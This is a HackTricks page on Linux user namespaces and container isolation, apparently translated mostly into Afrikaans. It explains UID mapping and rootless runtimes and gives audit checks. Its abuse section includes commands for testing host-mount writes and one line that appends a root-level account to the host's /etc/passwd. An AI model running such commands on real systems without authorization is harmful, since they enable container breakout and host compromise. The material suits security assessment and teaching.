# Gebruiker-namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die gebruiker-namespace verander die betekenis van gebruiker- en groep-ID's deur die kernel toe te laat om ID's wat binne die namespace gesien word na verskillende ID's buite te karteer. Dit is een van die belangrikste moderne kontenaer-beskermings omdat dit direk die grootste historiese probleem in klassieke kontenaers aanspreek: **root binne die kontenaer was eens ongemaklik naby root op die gasheer**.

Met gebruiker-namespaces kan 'n proses as UID 0 binne die kontenaer loop en steeds ooreenstem met 'n onbevoorregte UID-reeks op die gasheer. Dit beteken die proses kan soos root optree vir baie take binne die kontenaer, terwyl dit vanuit die gasheer se oogpunt baie minder magtig is. Dit los nie elke kontenaer-sekuriteitsprobleem op nie, maar dit verander die gevolge van 'n kontenaerkompromie aansienlik.

## Werking

'n gebruiker-namespace het kartograferingslêers soos `/proc/self/uid_map` en `/proc/self/gid_map` wat beskryf hoe namespace-ID's na ouer-ID's vertaal word. As root binne die namespace na 'n onbevoorregte host-UID gekarteer word, dra operasies wat regte host-root sou vereis nie dieselfde gewig nie. Dit is waarom user namespaces sentraal is tot **rootless containers** en waarom hulle een van die grootste verskille is tussen ouer rootful container-standaarde en meer moderne least-privilege-ontwerpe.

Die punt is subtiel maar besluitend: root binne die kontenaer word nie uitgeskakel nie, dit word **vertaal**. Die proses ervaar steeds 'n root-agtige omgewing plaaslik, maar die gasheer behoort dit nie as volle root te behandel nie.

## Lab

'n handmatige toets is:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Dit laat die huidige gebruiker binne die namespace as root voorkom, terwyl hy buite die namespace steeds nie root op die host is nie. Dit is een van die beste eenvoudige demo's om te verstaan waarom user namespaces so waardevol is.

In containers kan jy die sigbare mapping vergelyk met:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Die presiese uitvoer hang af daarvan of die engine user namespace remapping gebruik of 'n meer tradisionele rootful-konfigurasie.

Jy kan die mapping ook vanaf die host-kant lees met:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Runtime-gebruik

Rootless Podman is een van die duidelikste voorbeelde van user namespaces wat as 'n eersteklas sekuriteitsmeganisme behandel word. Rootless Docker is daar ook op staatgemaak. Docker se userns-remap-ondersteuning verbeter ook die veiligheid in rootful daemon-ontplooiings, alhoewel histories baie ontplooiings dit vir kompatibiliteitsredes gedeaktiveer gelaat het. Kubernetes-ondersteuning vir user namespaces het verbeter, maar aanvaarding en standaardinstellings verskil na gelang van runtime, distro en clusterbeleid. Incus/LXC-stelsels vertrou ook swaar op UID/GID-shifting en idmapping-idees.

Die algemene neiging is duidelik: omgewings wat user namespaces ernstig gebruik gee gewoonlik 'n beter antwoord op "wat beteken container root eintlik?" as omgewings wat dit nie doen nie.

## Gevorderde Mapping-besonderhede

Wanneer 'n onprivilegieerde proses skryf aan `uid_map` of `gid_map`, pas die kernel strenger reëls toe as wat dit doen vir 'n bevoorregte skrywer in die ouer-namespace. Slegs beperkte mappings word toegelaat, en vir `gid_map` moet die skrywer gewoonlik eers `setgroups(2)` uitskakel:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
This detail matters because it explains why user-namespace setup sometimes fails in rootless experiments and why runtimes need careful helper logic around UID/GID delegation.

Another advanced feature is the **ID-mapped mount**. Instead of changing on-disk ownership, an ID-mapped mount applies a user-namespace mapping to a mount so that ownership appears translated through that mount view. This is especially relevant in rootless and modern runtime setups because it allows shared host paths to be used without recursive `chown` operations. Security-wise, the feature changes how writable a bind mount appears from inside the namespace, even though it does not rewrite the underlying filesystem metadata.

Finally, remember that when a process creates or enters a new user namespace, it receives a full capability set **inside that namespace**. That does not mean it suddenly gained host-global power. It means those capabilities can be used only where the namespace model and other protections allow them. This is the reason `unshare -U` can suddenly make mounting or namespace-local privileged operations possible without directly making the host root boundary disappear.

## Miskonfigurasies

Die grootste swakpunt is eenvoudig om nie user namespaces te gebruik in omgewings waar dit haalbaar sou wees nie. As container root te direk na host root gemap word, word writable host mounts en bevoorregte kernel-operasies veel gevaarliker. ’n Ander probleem is om host user namespace sharing af te dwing of remapping te deaktiveer vir versoenbaarheid sonder om te erken hoeveel dit die trust boundary verander.

User namespaces moet ook saam met die res van die model oorweeg word. Selfs wanneer hulle aktief is, kan ’n breë runtime API-blootstelling of ’n baie swak runtime-konfigurasie steeds privilege escalation deur ander paaie moontlik maak. Maar sonder hulle word baie ou breakout-klasse baie makliker om te exploit.

## Misbruik

As die container rootful is sonder user namespace separation, ’n writable host bind mount word aansienlik gevaarliker omdat die proses moontlik werklik as host root skryf. Gevaarlike capabilities word ooreenkomstig meer betekenisvol. Die aanvaller hoef nie meer so hard teen die translation boundary te baklei nie omdat die translation boundary amper nie bestaan nie.

Die teenwoordigheid of afwesigheid van user namespaces moet vroeg nagegaan word wanneer ’n container breakout pad geëvalueer word. Dit beantwoord nie elke vraag nie, maar dit wys onmiddellik of "root in container" direkte host-betekenis het.

Die mees praktiese misbruikpatroon is om die mapping te bevestig en dan onmiddellik te toets of host-mounted inhoud skryfbaar is met host-relevante privileges:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
As die lêer as real host root geskep word, user namespace isolation is effektief afwesig vir daardie pad. Op daardie punt word klassieke host-file abuses realisties:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
’n Veiliger bevestiging tydens 'n live assessment is om 'n onskadelike merker te skryf in plaas van om kritieke lêers te wysig:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Hierdie kontroles is belangrik omdat hulle die werklike vraag vinnig beantwoord: is root in hierdie container genoegsaam aan host root toegeken dat 'n writable host mount dadelik 'n host compromise path word?

### Volledige Voorbeeld: Herwin van Namespace-lokale capabilities

Indien seccomp `unshare` toelaat en die omgewing 'n nuwe user namespace permitteer, kan die proses 'n volledige capability set binne daardie nuwe namespace herwin:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Dit is op sigself nie 'n host escape' nie. Die rede waarom dit saak maak, is dat user namespaces privileged namespace-local actions weer kan aktiveer wat later met weak mounts, vulnerable kernels, of badly exposed runtime surfaces kan kombineer.

## Checks

Hierdie opdragte is bedoel om die belangrikste vraag op hierdie bladsy te beantwoord: wat stem root binne hierdie container ooreen met op die host?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
Wat hier interessant is:

- As die proses UID 0 is en die maps 'n direkte of baie naby host-root mapping toon, is die container baie meer gevaarlik.
- As root na 'n unprivileged host range gemap is, is dit 'n veel veiliger basislyn en dui dit gewoonlik op werklike user namespace isolasie.
- Die mapping-lêers is meer waardevol as `id` alleen, omdat `id` slegs die namespace-lokale identiteit wys.

As die workload as UID 0 loop en die mapping toon dat dit noukeurig ooreenstem met host root, moet jy die res van die container se voorregte veel strenger interpreteer.
{{#include ../../../../../banners/hacktricks-training.md}}
